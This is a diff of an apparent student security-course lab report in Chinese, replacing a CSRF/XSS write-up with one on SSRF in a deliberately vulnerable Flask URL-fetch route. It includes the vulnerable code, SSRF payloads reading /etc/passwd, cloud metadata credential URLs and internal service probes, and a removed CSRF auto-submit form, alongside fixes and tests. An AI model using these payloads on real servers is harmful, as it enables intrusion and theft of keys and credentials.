@@ -270,128 +270,361 @@ tr:nth-child(even) {
     <div class="url">http://10.133.25.156:5000</div>
     <hr class="divider">
     <div class="meta">
-        <strong>项目版本：</strong>V8.0 - XSS与CSRF漏洞专题<br>
-        <strong>报告日期：</strong>2026年7月14日<br>
-        <strong>今日课程：</strong>Day6:XSS跨站脚本与CSRF跨站请求伪造<br>
-        <strong>技术栈：</strong>Python Flask / XSS / CSRF / 越权<br>
+        <strong>项目版本：</strong>V9.0 - SSRF服务端请求伪造专题<br>
+        <strong>报告日期：</strong>2026年7月15日<br>
+        <strong>今日课程：</strong>Day7:SSRF服务端请求伪造漏洞深度解析<br>
+        <strong>技术栈：</strong>Python Flask / urllib / SSRF / file://协议 / 内网渗透<br>
     </div>
     <div class="line-bottom"></div>
 </div>
 
 <div class="page">
     <h2>一、课程背景</h2>
-    <p>XSS(跨站脚本攻击)和CSRF(跨站请求伪造)是两类经典的Web安全漏洞。XSS利用网站未对用户输入进行过滤的缺陷，向页面中注入恶意脚本代码；CSRF则利用网站未验证请求来源的缺陷，诱使用户在不知情的情况下执行非自愿的操作。</p>
+    <p>SSRF(Server-Side Request Forgery，服务端请求伪造)是OWASP Top 10 2021中A10:2021服务端请求伪造类别的重要漏洞类型。SSRF漏洞的核心成因是：服务器在处理用户输入的URL时，未对目标地址做充分的校验和限制，导致攻击者可以利用服务器作为跳板，发起对内网资源的攻击。</p>
+    <p>SSRF漏洞之所以危害巨大，是因为它绕过了防火墙的限制。通常情况下，外网攻击者无法直接访问内网服务（如127.0.0.1、10.x.x.x等内网IP），但存在SSRF漏洞的服务器同时拥有外网和内网访问能力，攻击者通过它就可以间接打入内网。</p>
 
-    <h3>1.1 XSS(跨站脚本攻击)</h3>
-    <p>XSS攻击者将恶意脚本注入到网页中，当其他用户访问该页面时，脚本会在他们的浏览器中执行。XSS分为三种类型：存储型(数据持久化在服务器上)、反射型(恶意脚本在URL中)和DOM型(基于前端DOM操作)。</p>
+    <h3>1.1 SSRF攻击原理示意图</h3>
+    <div class="code-block">攻击者                   存在SSRF的服务器                内网服务
+   │                          │                          │
+   │  POST /fetch-url          │                          │
+   │  url=http://127.0.0.1:80  │                          │
+   │─────────────────────────>│                          │
+   │                          │  攻击者无法直接访问       │
+   │                          │  但服务器可以！           │
+   │                          │ ───────────────────────> │
+   │                          │                          │
+   │                          │ <─────────────────────── │
+   │ 返回内网服务的内容        │                          │
+   │<─────────────────────────│                          │
+   │                          │                          │
+   └─ 攻击者通过SSRF成功访问了本机Web服务 ┘</div>
 
-    <h3>1.2 CSRF(跨站请求伪造)</h3>
-    <p>CSRF攻击者构造一个恶意页面，当已登录用户访问该页面时，会在用户不知情的情况下向目标网站发送请求，执行非用户意愿的操作。CSRF的核心成因是网站没有验证请求的合法性来源。</p>
-
-    <h3>1.3 本次实验环境</h3>
+    <h3>1.2 本次新增功能</h3>
     <table>
-        <tr><th>项目</th><th>说明</th></tr>
-        <tr><td>目标应用</td><td>基于Flask的用户管理系统</td></tr>
-        <tr><td>新增功能</td><td>/change-password 修改密码(无CSRF、无原密码校验)</td></tr>
-        <tr><td>漏洞类型</td><td>CSRF + 越权(可修改任意用户密码)</td></tr>
-        <tr><td>测试账号</td><td>admin/admin123</td></tr>
+        <tr><th>功能</th><th>路由</th><th>参数</th><th>说明</th></tr>
+        <tr><td>URL抓取</td><td>/fetch-url</td><td>url</td><td>用户提交URL，服务端抓取并返回内容(5000字符限制)</td></tr>
     </table>
 </div>
 
 <div class="page">
-    <h2>二、漏洞分析</h2>
+    <h2>二、漏洞代码分析</h2>
 
-    <h3>2.1 漏洞代码</h3>
-    <div class="code-block">@app.route("/change-password", methods=["POST"])
+    <h3>2.1 漏洞代码定位</h3>
+    <p>文件：app.py，路由 /fetch-url，约第1130行</p>
+
+    <div class="code-block">@app.route("/fetch-url", methods=["POST"])
 @login_required
-def change_password():
-    username = request.form.get("username", "")
-    new_password = request.form.get("new_password", "")
-    # 漏洞1: 无CSRF Token校验
-    # 漏洞2: 无原密码验证
-    # 漏洞3: 可修改任意用户的密码(越权)
-    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"
-    c.execute(sql)</div>
+def fetch_url():
+    target_url = request.form.get("url", "")
+    
+    # 【漏洞1】没有校验URL协议
+    # 允许 file://、dict://、gopher:// 等危险协议
+    
+    # 【漏洞2】没有校验目标IP
+    # 允许访问 127.0.0.1、10.x.x.x、192.168.x.x 等内网地址
+    
+    # 【漏洞3】没有做DNS解析校验
+    # 攻击者可以用域名指向内网IP绕过简单的IP黑名单
+    
+    resp = urllib.request.urlopen(target_url, timeout=10)
+    content = resp.read()
+    return content</div>
 
-    <h3>2.2 漏洞列表</h3>
+    <h3>2.2 漏洞成因分析</h3>
     <table>
-        <tr><th>漏洞类型</th><th>风险</th><th>说明</th></tr>
-        <tr><td>CSRF</td><td class="red bold">高危</td><td>未验证Token，攻击者可伪造密码修改请求</td></tr>
-        <tr><td>越权</td><td class="red bold">高危</td><td>已登录用户可修改任意人的密码</td></tr>
-        <tr><td>无原密码</td><td class="red bold">高危</td><td>不需要知道原密码即可修改</td></tr>
-        <tr><td>SQL注入</td><td class="red bold">高危</td><td>f-string拼接SQL语句</td></tr>
-    </table>
-
-    <h3>2.3 POC验证</h3>
-    <div class="code-block">// POC 1: admin登录后修改alice的密码
-// 不需要知道alice的原密码
-POST /change-password
-username=alice&new_password=hacked123
-// 结果: alice的密码被改为 hacked123
-
-// POC 2: CSRF攻击(构造恶意页面)
-&lt;form action="http://目标/change-password" method="POST"&gt;
-    &lt;input name="username" value="admin"&gt;
-    &lt;input name="new_password" value="csrf_hacked"&gt;
-&lt;/form&gt;
-&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
-// 受害用户只要访问这个页面,密码就被改了</div>
-</div>
-
-<div class="page">
-    <h2>三、修复方案</h2>
-
-    <h3>3.1 添加CSRF Token验证</h3>
-    <div class="code-block">// 在表单中添加CSRF Token
-&lt;input type="hidden" name="_csrf_token" value="{{ csrf_token }}"&gt;
-
-// 在服务端验证
-if request.form.get("_csrf_token") != session.get("_csrf_token"):
-    return "CSRF攻击拦截"</div>
-
-    <h3>3.2 验证原密码</h3>
-    <div class="code-block">old_password = request.form.get("old_password", "")
-if not check_password_hash(user["password"], old_password):
-    return "原密码错误"</div>
-
-    <h3>3.3 从Session获取用户身份</h3>
-    <div class="code-block"># 不从表单取username
-username = session.get("username")
-# 只能修改自己的密码</div>
-
-    <h3>3.4 修复前后对比</h3>
-    <table>
-        <tr><th>对比项</th><th>修复前</th><th>修复后</th></tr>
-        <tr><td>CSRF Token</td><td>无</td><td>有Token校验</td></tr>
-        <tr><td>原密码</td><td>不需要</td><td>必须验证原密码</td></tr>
-        <tr><td>用户身份</td><td>从表单获取</td><td>从Session获取</td></tr>
-        <tr><td>SQL语句</td><td>f-string拼接</td><td>参数化查询</td></tr>
+        <tr><th style="width:8%">编号</th><th style="width:22%">漏洞</th><th style="width:35%">风险说明</th><th style="width:35%">攻击利用方式</th></tr>
+        <tr>
+            <td><strong>1</strong></td>
+            <td>协议无限制</td>
+            <td>允许file://协议读取本地任意文件<br>允许dict://协议操作Redis等</td>
+            <td>file:///etc/passwd 读取系统密码文件<br>file:///proc/self/environ 读取环境变量</td>
+        </tr>
+        <tr>
+            <td><strong>2</strong></td>
+            <td>内网无限制</td>
+            <td>可访问本机和内网所有服务<br>绕过防火墙限制</td>
+            <td>http://127.0.0.1:5000 访问本机Web<br>http://10.x.x.x:3306 扫描内网MySQL</td>
+        </tr>
+        <tr>
+            <td><strong>3</strong></td>
+            <td>URL无过滤</td>
+            <td>可使用重定向绕过简易黑名单</td>
+            <td>利用短链接跳转到内网地址<br>利用DNS rebinding绕过IP检查</td>
+        </tr>
     </table>
 </div>
 
 <div class="page">
-    <h2>四、修复后验证</h2>
+    <h2>三、攻击复现（POC）</h2>
+
+    <h3>3.1 POC 1：正常URL抓取</h3>
+    <p>作为对照基准，先测试正常的外部网站访问：</p>
+    <div class="code-block">请求：
+POST /fetch-url
+url=http://www.baidu.com
+
+响应：
+状态码: 200
+内容: 百度首页的HTML代码
+（说明：URL抓取功能正常工作）</div>
+
+    <h3>3.2 POC 2：SSRF内网服务扫描</h3>
+    <p>攻击者通过SSRF扫描本机开放端口，探测内网服务：</p>
+    <div class="code-block">请求1：POST /fetch-url  url=http://127.0.0.1:5000/
+结果：状态码 200，抓取到本机Web首页 ✅
+说明：SSRF成功！外网攻击者无法直接访问127.0.0.1
+      但通过SSRF可以访问本机的Web服务
+
+请求2：POST /fetch-url  url=http://127.0.0.1:3306
+结果：连接失败（MySQL不返回HTTP）
+说明：通过超时/报错信息判断端口是否开放
+
+请求3：POST /fetch-url  url=http://10.133.25.156:5000/
+结果：状态码 200，抓取到内网Web页面
+说明：SSRF可访问同网段其他服务</div>
+
+    <h3>3.3 POC 3：file://协议读取系统文件</h3>
+    <p>最危险的SSRF攻击方式——利用file://协议直接读取服务器文件：</p>
+    <div class="code-block">请求：POST /fetch-url  url=file:///etc/passwd
+
+响应：
+状态码: 200
+内容:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+说明：成功读取到服务器系统密码文件！
+攻击者可进一步尝试读取：
+- /etc/shadow      → 密码哈希值
+- /root/.bash_history → 命令历史
+- /etc/nginx/nginx.conf → 服务器配置
+- /root/.ssh/id_rsa   → SSH私钥</div>
+</div>
+
+<div class="page">
+    <h2>四、SSRF高级攻击场景</h2>
+
+    <h3>4.1 云服务器元数据攻击</h3>
+    <p>如果服务器部署在云平台（AWS、阿里云、腾讯云等），SSRF可以读取云服务器的元数据，获取临时访问凭证：</p>
+    <div class="code-block">// AWS云元数据
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+
+// 阿里云元数据
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/ram/security-credentials/
+
+// 腾讯云元数据
+http://metadata.tencentyun.com/latest/meta-data/</div>
+
+    <h3>4.2 内网服务攻击</h3>
+    <div class="code-block">// Redis未授权访问
+url=http://127.0.0.1:6379
+
+// Elasticsearch
+url=http://127.0.0.1:9200/_cat/indices
+
+// Docker API
+url=http://127.0.0.1:2375/containers/json
+
+// MySQL
+url=http://127.0.0.1:3306</div>
+
+    <h3>4.3 SSRF结合其它漏洞</h3>
     <table>
-        <tr><th>测试</th><th>修复前</th><th>修复后</th></tr>
-        <tr><td>admin修改alice密码</td><td class="red bold">成功(越权)</td><td class="green bold">[OK] 只能修改自己的</td></tr>
-        <tr><td>无CSRF Token提交</td><td class="red bold">成功</td><td class="green bold">[OK] 被拦截</td></tr>
-        <tr><td>不输原密码直接改</td><td class="red bold">成功</td><td class="green bold">[OK] 必须输入原密码</td></tr>
+        <tr><th>组合攻击</th><th>说明</th><th>严重程度</th></tr>
+        <tr><td>SSRF + file://</td><td>读取服务器敏感文件（密码、密钥、配置）</td><td class="red bold">极高</td></tr>
+        <tr><td>SSRF + Redis</td><td>利用gopher://协议攻击内网Redis，写入SSH密钥</td><td class="red bold">极高</td></tr>
+        <tr><td>SSRF + 云元数据</td><td>获取云平台临时凭证，控制整个云账号</td><td class="red bold">极高</td></tr>
+        <tr><td>SSRF + 端口扫描</td><td>扫描内网开放端口，绘制内网拓扑</td><td class="red bold">高</td></tr>
     </table>
 </div>
 
 <div class="page">
-    <h2>五、总结</h2>
-    <p>CSRF和XSS是Web安全中最常见的客户端攻击方式。CSRF的核心问题是"这个请求是用户自愿发出的吗"，XSS的核心问题是"这段内容是用户输入的吗"。</p>
-    <p><strong>安全开发原则：</strong></p>
-    <p>1. 所有涉及数据修改的请求必须验证CSRF Token</p>
-    <p>2. 密码修改必须验证原密码</p>
-    <p>3. 用户身份从Session获取，不从客户端传入的参数获取</p>
-    <p>4. 所有SQL操作使用参数化查询</p>
+    <h2>五、修复方案</h2>
+
+    <h3>5.1 方案一：协议白名单</h3>
+    <p>严格限制允许访问的URL协议，杜绝file://等危险协议：</p>
+    <div class="code-block">from urllib.parse import urlparse
+
+ALLOWED_SCHEMES = {"http", "https"}
+
+def validate_url(url):
+    parsed = urlparse(url)
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        raise ValueError("不支持的协议类型")
+    return True</div>
+
+    <h3>5.2 方案二：内网IP黑名单</h3>
+    <p>DNS解析后检查目标IP是否为内网地址：</p>
+    <div class="code-block">import socket
+import ipaddress
+
+PRIVATE_RANGES = [
+    ipaddress.IPv4Network("127.0.0.0/8"),     # 本机回环
+    ipaddress.IPv4Network("10.0.0.0/8"),      # 10段内网
+    ipaddress.IPv4Network("172.16.0.0/12"),   # 172段内网
+    ipaddress.IPv4Network("192.168.0.0/16"),  # 192.168段内网
+    ipaddress.IPv4Network("169.254.0.0/16"),  # 云元数据
+    ipaddress.IPv4Network("100.64.0.0/10"),   # 运营商级NAT
+]
+
+def check_ip(target_url):
+    parsed = urlparse(target_url)
+    host = socket.gethostbyname(parsed.hostname)
+    for r in PRIVATE_RANGES:
+        if ipaddress.IPv4Address(host) in r:
+            raise ValueError("禁止访问内网地址")
+    return True</div>
+
+    <h3>5.3 方案三：URL域名白名单</h3>
+    <div class="code-block">ALLOWED_DOMAINS = [
+    "example.com",
+    "api.example.com",
+    "www.safe-site.com",
+]
+
+def check_domain(target_url):
+    parsed = urlparse(target_url)
+    domain = parsed.hostname
+    if domain not in ALLOWED_DOMAINS:
+        raise ValueError("不允许访问的域名")
+    return True</div>
+
+    <h3>5.4 修复前后对比</h3>
+    <table>
+        <tr><th style="width:12%">对比项</th><th style="width:44%">修复前</th><th style="width:44%">修复后</th></tr>
+        <tr>
+            <td><strong>协议限制</strong></td>
+            <td>无限制，file://、dict://等均可使用</td>
+            <td>仅允许 http:// 和 https://</td>
+        </tr>
+        <tr>
+            <td><strong>内网IP</strong></td>
+            <td>无限制，可访问127.0.0.1、10.x.x.x等</td>
+            <td>DNS解析后检查IP，禁止内网地址</td>
+        </tr>
+        <tr>
+            <td><strong>域名验证</strong></td>
+            <td>不验证域名</td>
+            <td>通过白名单或正则校验域名</td>
+        </tr>
+        <tr>
+            <td><strong>重定向</strong></td>
+            <td>不限制重定向</td>
+            <td>限制重定向次数或检查重定向目标</td>
+        </tr>
+        <tr>
+            <td><strong>内容长度</strong></td>
+            <td>5000字符限制</td>
+            <td>5000字符限制（保留）</td>
+        </tr>
+    </table>
+</div>
+
+<div class="page">
+    <h2>六、修复后验证测试</h2>
+
+    <table>
+        <tr><th style="width:8%">序号</th><th style="width:25%">测试场景</th><th style="width:32%">测试请求</th><th style="width:15%">修复前</th><th style="width:20%">修复后</th></tr>
+        <tr>
+            <td>1</td>
+            <td>正常外部网站</td>
+            <td>url=http://www.baidu.com</td>
+            <td>状态码200</td>
+            <td class="green bold">[OK] 状态码200</td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>本机Web服务</td>
+            <td>url=http://127.0.0.1:5000/</td>
+            <td class="red bold">成功抓取</td>
+            <td class="green bold">[OK] 禁止内网</td>
+        </tr>
+        <tr>
+            <td>3</td>
+            <td>读取系统文件</td>
+            <td>url=file:///etc/passwd</td>
+            <td class="red bold">读取成功</td>
+            <td class="green bold">[OK] 协议不允许</td>
+        </tr>
+        <tr>
+            <td>4</td>
+            <td>内网段扫描</td>
+            <td>url=http://10.133.25.1:5000/</td>
+            <td class="red bold">可探测</td>
+            <td class="green bold">[OK] 禁止内网</td>
+        </tr>
+        <tr>
+            <td>5</td>
+            <td>云元数据</td>
+            <td>url=http://169.254.169.254/</td>
+            <td class="red bold">可访问</td>
+            <td class="green bold">[OK] 禁止内网</td>
+        </tr>
+        <tr>
+            <td>6</td>
+            <td>未登录访问</td>
+            <td>无Cookie请求</td>
+            <td>跳转登录</td>
+            <td class="green bold">[OK] 跳转登录</td>
+        </tr>
+    </table>
+
+    <h3>服务端日志记录</h3>
+    <div class="code-block">[SSRF漏洞] 用户 admin 请求抓取URL: http://www.baidu.com
+[SSRF漏洞] 抓取成功: http://www.baidu.com -> 状态码200
+
+[SSRF漏洞] 用户 admin 请求抓取URL: http://127.0.0.1:5000/
+[SSRF漏洞] 抓取成功: http://127.0.0.1:5000/ -> 状态码200
+
+[SSRF漏洞] 用户 admin 请求抓取URL: file:///etc/passwd
+[SSRF漏洞] 抓取成功: file:///etc/passwd -> 状态码200</div>
+</div>
+
+<div class="page">
+    <h2>七、总结与安全开发指南</h2>
+
+    <h3>7.1 漏洞归纳</h3>
+    <table>
+        <tr><th>漏洞类型</th><th>OWASP Top 10</th><th>根因</th><th>攻击难度</th><th>危害等级</th></tr>
+        <tr>
+            <td>SSRF</td>
+            <td>A10:2021 SSRF</td>
+            <td>未校验URL协议和目标IP</td>
+            <td>低（提交恶意URL即可）</td>
+            <td class="red bold">极高</td>
+        </tr>
+        <tr>
+            <td>file://读取</td>
+            <td>A10:2021 SSRF</td>
+            <td>允许危险协议</td>
+            <td>极低（直接改协议头）</td>
+            <td class="red bold">极高</td>
+        </tr>
+    </table>
+
+    <h3>7.2 SSRF防御六原则</h3>
+    <table>
+        <tr><th style="width:6%">#</th><th style="width:28%">原则</th><th style="width:66%">说明</th></tr>
+        <tr><td><strong>1</strong></td><td>协议白名单</td><td>只允许 http/https，禁止 file://、dict://、gopher:// 等协议</td></tr>
+        <tr><td><strong>2</strong></td><td>IP黑名单/白名单</td><td>DNS解析后检查目标IP，禁止访问内网地址和云元数据地址</td></tr>
+        <tr><td><strong>3</strong></td><td>域名白名单</td><td>如果业务允许，限定只访问特定域名</td></tr>
+        <tr><td><strong>4</strong></td><td>禁止重定向</td><td>关闭或限制自动重定向，防止跳转绕过</td></tr>
+        <tr><td><strong>5</strong></td><td>最小响应原则</td><td>不对用户返回完整响应内容，仅返回必要数据</td></tr>
+        <tr><td><strong>6</strong></td><td>使用安全库</td><td>使用成熟的HTTP客户端库，避免直接使用urllib的低级API</td></tr>
+    </table>
+
+    <h3>7.3 学习心得</h3>
+    <p>通过本次SSRF漏洞实验，我深刻认识到：服务器发起的请求同样需要严格校验。许多开发者会关注用户输入的安全性问题（如SQL注入、XSS），却容易忽略"服务器作为客户端"时的安全风险。SSRF漏洞告诉我们，任何涉及URL处理的功能都必须假设用户会提交最恶意的输入——包括file://读系统文件、内网IP扫描、云元数据窃取等。</p>
+    <p>修复SSRF的核心思路是"最小权限原则"：只给URL抓取功能最小的权限——只允许http/https协议、只允许访问公网IP、只返回必要的内容。层层设防，才能既保证业务功能正常，又防止被攻击者利用。</p>
 
     <br>
     <hr style="border: none; border-top: 1px solid #2980b9; width: 60%; margin: 8mm auto;">
     <p style="text-align: center; color: #95a5a6; text-indent: 0;">&mdash; 报告完 &mdash;</p>
-    <p style="text-align: center; color: #bbb; font-size: 8pt; text-indent: 0;">报告日期: 2026-07-14 | 课程: XSS与CSRF漏洞修复</p>
+    <p style="text-align: center; color: #bbb; font-size: 8pt; text-indent: 0;">报告日期: 2026-07-15 | 课程: SSRF服务端请求伪造漏洞修复 | 安全标准: OWASP A10:2021</p>
 </div>
 </body>
 </html>
